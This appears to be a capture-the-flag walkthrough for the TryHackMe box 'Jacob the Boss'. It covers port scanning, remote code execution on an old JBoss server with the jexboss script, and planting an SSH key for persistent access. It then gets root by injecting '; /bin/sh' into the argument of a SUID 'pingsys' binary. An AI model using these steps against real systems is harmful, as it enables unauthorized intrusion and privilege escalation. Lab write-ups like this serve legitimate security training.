---
published: true
image: 'https://imgur.com/XhGMQvY.png'
title: Jacob the Boss - TryHackMe Walkthrough
author: f3dai
category: Writeup
---
Jacob the Boss - "Find a way in and learn a little more." This is a TryHackMe box. To access this you must sign up to [https://tryhackme.com/](https://tryhackme.com/).

**URL:** [The Blob Blog](https://tryhackme.com/room/theblobblog)

**Difficulty:** Medium

**Author:** bobbloblaw

Well, the flaw that makes up this box is the reproduction found in the production environment of a customer a while ago, the verification in season consisted of two steps, the last one within the environment, we hit it head-on and more than 15 machines were vulnerable that together with the development team we were able to correct and adapt. 

*First of all, add the jacobtheboss.box address to your hosts file.*

Anyway, learn a little more, have fun!

## Enumeration

Let's start by adding "jacobtheboss.box" to our etc hosts file. 

Let's run a port scan:

<pre>PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:ca:13:6e:d9:63:c0:5f:4a:23:a5:a5:a5:10:3c:7f (RSA)
|   256 a4:6e:d2:5d:0d:36:2e:73:2f:1d:52:9c:e5:8a:7b:04 (ECDSA)
|_  256 6f:54:a6:5e:ba:5b:ad:cc:87:ee:d3:a8:d5:e0:aa:2a (ED25519)
80/tcp    open  http         Apache httpd 2.4.6 ((CentOS) PHP/7.3.20)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.20
|_http-title: My first blog
111/tcp   open  rpcbind      2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
1090/tcp  open  java-rmi     Java RMI
|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
1098/tcp  open  java-rmi     Java RMI
1099/tcp  open  java-object  Java Object Serialization
| fingerprint-strings: 
|   NULL: 
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     http://jacobtheboss.box:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpw;
|     UnicastRef2
|_    jacobtheboss.box
3306/tcp  open  mysql        MariaDB (unauthorized)
3873/tcp  open  java-object  Java Object Serialization
4444/tcp  open  java-rmi     Java RMI
4445/tcp  open  java-object  Java Object Serialization
4446/tcp  open  java-object  Java Object Serialization
4457/tcp  open  tandem-print Sharp printer tandem printing
4712/tcp  open  msdtc        Microsoft Distributed Transaction Coordinator (error)
4713/tcp  open  pulseaudio?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    a549
8009/tcp  open  ajp13        Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|   Potentially risky methods: PUT DELETE TRACE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp  open  http         Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Unknown favicon MD5: 799F70B71314A7508326D1D2F68F7519
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|_  Potentially risky methods: PUT DELETE TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Welcome to JBoss&trade;
8083/tcp  open  http         JBoss service httpd
|_http-title: Site doesn't have a title (text/html).
29912/tcp open  unknown
33093/tcp open  java-rmi     Java RMI
42313/tcp open  unknown
5 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1099-TCP:V=7.80%I=7%D=9/28%Time=5F7249B2%P=x86_64-pc-linux-gnu%r(NU
SF:LL,16F,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x1e\x97
SF:\xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08objByt
SF:esq\0~\0\x01xp\xa8\xceY\x93ur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02
SF:\0\0xp\0\0\0\.\xac\xed\0\x05t\0\x1dhttp://jacobtheboss\.box:8083/q\0~\0
SF:\0q\0~\0\0uq\0~\0\x03\0\0\0\xc7\xac\xed\0\x05sr\0\x20org\.jnp\.server\.
SF:NamingServer_Stub\0\0\0\0\0\0\0\x02\x02\0\0xr\0\x1ajava\.rmi\.server\.R
SF:emoteStub\xe9\xfe\xdc\xc9\x8b\xe1e\x1a\x02\0\0xr\0\x1cjava\.rmi\.server
SF:\.RemoteObject\xd3a\xb4\x91\x0ca3\x1e\x03\0\0xpw;\0\x0bUnicastRef2\0\0\
SF:x10jacobtheboss\.box\0\0\x04J\0\0\0\0\0\0\0\0\xd5=,\[\0\0\x01t\xd6nC\xa
SF:9\x80\0\0x");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3873-TCP:V=7.80%I=7%D=9/28%Time=5F7249B7%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4445-TCP:V=7.80%I=7%D=9/28%Time=5F7249B7%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4446-TCP:V=7.80%I=7%D=9/28%Time=5F7249B7%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4713-TCP:V=7.80%I=7%D=9/28%Time=5F7249B7%P=x86_64-pc-linux-gnu%r(NU
SF:LL,5,"a549\n")%r(GenericLines,5,"a549\n")%r(GetRequest,5,"a549\n")%r(HT
SF:TPOptions,5,"a549\n")%r(RTSPRequest,5,"a549\n")%r(RPCCheck,5,"a549\n")%
SF:r(DNSVersionBindReqTCP,5,"a549\n")%r(DNSStatusRequestTCP,5,"a549\n")%r(
SF:Help,5,"a549\n")%r(SSLSessionReq,5,"a549\n")%r(TerminalServerCookie,5,"
SF:a549\n")%r(TLSSessionReq,5,"a549\n")%r(Kerberos,5,"a549\n")%r(SMBProgNe
SF:g,5,"a549\n")%r(X11Probe,5,"a549\n")%r(FourOhFourRequest,5,"a549\n")%r(
SF:LPDString,5,"a549\n")%r(LDAPSearchReq,5,"a549\n")%r(LDAPBindReq,5,"a549
SF:\n")%r(SIPOptions,5,"a549\n")%r(LANDesk-RC,5,"a549\n")%r(TerminalServer
SF:,5,"a549\n")%r(NCP,5,"a549\n")%r(NotesRPC,5,"a549\n")%r(JavaRMI,5,"a549
SF:\n")%r(WMSRequest,5,"a549\n")%r(oracle-tns,5,"a549\n")%r(ms-sql-s,5,"a5
SF:49\n")%r(afp,5,"a549\n")%r(giop,5,"a549\n");
Service Info: OS: Windows; Device: printer; CPE: cpe:/o:microsoft:windows
</pre>

Loads of ports open. Let's check out all the HTTP ports first. 

**Port 80**

![Port 80](https://imgur.com/OHusbfa.png)

Let's run a directory scan:

<pre>wfuzz -u http://jacobtheboss.box/FUZZ -w /usr/share/wordlists/wfuzz/general/big.txt -c --hc 404,403</pre>

I got:

<pre>===================================================================
ID           Response   Lines    Word     Chars       Payload                      
===================================================================

000000119:   301        7 L      20 W     238 Ch      "admin"                      
000002185:   301        7 L      20 W     239 Ch      "public"                     
</pre>

I also saw a comment by the user "jacob" on the homepage. The blog seems to be running "Dotclear", a blog management. A quick search reveals some vulnerabilities but we don't know the version yet. Let's enumerate properly before trying any exploits.

**/admin**:

![/admin](https://imgur.com/Skcjt8M.png)

**/public**

![/public](https://imgur.com/o7ZMRsD.png)

Let's move onto the next port.

**Port 8080**

![port 8080](https://imgur.com/UhDEFIT.png)

This seems to be running JBoss. I found some information on /web-console:

![jboss version](https://imgur.com/OBKn8M0.png)

<pre>Version

Version: 5.0.0.GA</pre>

A quick search shows some exploits such as RCE (https://www.exploit-db.com/exploits/36575)

**Port 8083**

Returns nothing. Seems like this is related to jboss, according to the nmap scan. 

Next on my list is TCP port 111, rpcbind. I run the following command and get a result:

<pre>┌─[user@parrot]─[/home]
└──╼ $rpcinfo jacobtheboss.box
   program version netid     address                service    owner
    100000    4    tcp6      ::.0.111               portmapper superuser
    100000    3    tcp6      ::.0.111               portmapper superuser
    100000    4    udp6      ::.0.111               portmapper superuser
    100000    3    udp6      ::.0.111               portmapper superuser
    100000    4    tcp       0.0.0.0.0.111          portmapper superuser
    100000    3    tcp       0.0.0.0.0.111          portmapper superuser
    100000    2    tcp       0.0.0.0.0.111          portmapper superuser
    100000    4    udp       0.0.0.0.0.111          portmapper superuser
    100000    3    udp       0.0.0.0.0.111          portmapper superuser
    100000    2    udp       0.0.0.0.0.111          portmapper superuser
    100000    4    local     /var/run/rpcbind.sock  portmapper superuser
    100000    3    local     /var/run/rpcbind.sock  portmapper superuser
</pre>

<pre>┌─[user@parrot]─[/home]
└──╼ $rpcinfo -p jacobtheboss.box
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
</pre>

This dump confirms that portmapper is running on port 111.

I tried connecting with the following command but no luck without a password:

<pre>rpcclient --I jacobtheboss.box</pre>

And

<pre>┌─[user@parrot]─[10.8.98.105]─[~/tryhackme/JacobBoss]
└──╼ $rpcclient --I jacobtheboss.box 
Enter WORKGROUP\user's password: 
Cannot connect to server.  Error was NT_STATUS_CONNECTION_REFUSED
</pre>

I also try to showmount:

<pre>┌─[user@parrot]─[10.8.98.105]─[~/tryhackme/JacobBoss]
└──╼ $showmount -e 10.8.98.105
clnt_create: RPC: Unable to receive
</pre>

I'm happy to start exploiting the service running on port 8080 as that seems to be the best bet. 

I found the following resource for RCE with JBoss:

[jexboss - Github](https://github.com/joaomatosf/jexboss)

<pre>git clone https://github.com/joaomatosf/jexboss.git
cd jexboss</pre>

Execute the script to get a reverse shell:

<pre>py jexboss.py -host http://jacobtheboss.box:8080</pre>

![RCE script](https://imgur.com/2r1NnU6.png)

It's apparent that the JBoss server is vulnerable. We are asked if we want a shell.

We now have user "jacob".

![shell](https://imgur.com/yoPXuZv.png)

This shell is pretty limited so I want to upgrade my shell. We saw ssh was open so I'll add myself. Create an ssh key and add it to "authorized_keys". Jacob doesn't have this set up yet so create a directory /home/jacob/.ssh and add your public key into a file called authorized_keys.

<pre>mkdir /home/jacob/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADA .... = user@parrot" > /home/jacob/.ssh/authorized_keys</pre>

And we can connect with our private key:

<pre>ssh -i [private key] jacob@jacobtheboss.box</pre>

## Root

Let's do some privesc now that we have user.

Privesc enumeration must always look for SUID binaries:

<pre>┌─[user@parrot]─[~/tryhackme]
└──╼ $ssh -i f3dai jacob@jacobtheboss.box
Last login: Sat Oct  3 18:25:59 2020 from 10.8.98.105
[jacob@jacobtheboss ~]$ find / -perm -4000 2>/dev/null
/usr/bin/pingsys
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chage
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
</pre>

Nothing immediately sticks out, and none are listed on GTFObins so I research each one.

I found this:

[Privilege Escalation pingsys - securit.stackexchange.com](https://security.stackexchange.com/questions/196577/privilege-escalation-c-functions-setuid0-with-system-not-working-in-linux)

We are told to run the following command:

<pre>pingSys "127.0.0.1; /bin/sh"</pre>

![pingsys](https://imgur.com/4f9lo7o.png)

And we are root :)


